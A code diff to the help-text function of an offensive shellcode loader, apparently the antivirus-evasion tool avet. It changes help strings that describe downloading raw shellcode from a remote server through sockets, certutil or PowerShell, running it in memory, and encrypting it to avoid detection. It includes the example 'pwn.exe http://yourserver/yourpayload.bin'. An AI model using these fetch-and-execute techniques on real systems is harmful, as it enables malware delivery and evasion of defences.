@@ -259,9 +259,11 @@ void print_help()
 	printf("-u load and exec shellcode from url using internet explorer (url is compiled into executable)\n");
 	printf("-d download the shellcode file using different techniques\n");
 	printf("   -d sock -> for downloading a raw shellcode via http in memory and exec (no overhead, use socket)\n");
+	printf("      usage example: pwn.exe http://yourserver/yourpayload.bin\n");
 	printf("   -d certutil -> use certutil.exe for downloading the file\n");
 	printf("   -d powershell -> use powershell for downloading the file\n");
-	printf("   usage example: pwn.exe http://yourserver/yourpayload.bin\n");
+	printf("      usage of -d certutil/powershell in combination with -f\n");
+	printf("      for executing the raw shellcode after downloading\n");
 	printf("-E use avets ASCII encryption, often do not has to be used\n");
 	printf("   Can be used with -l\n");
 	//printf("-A use metasploits ASCII encryption, usage is like -E\n");
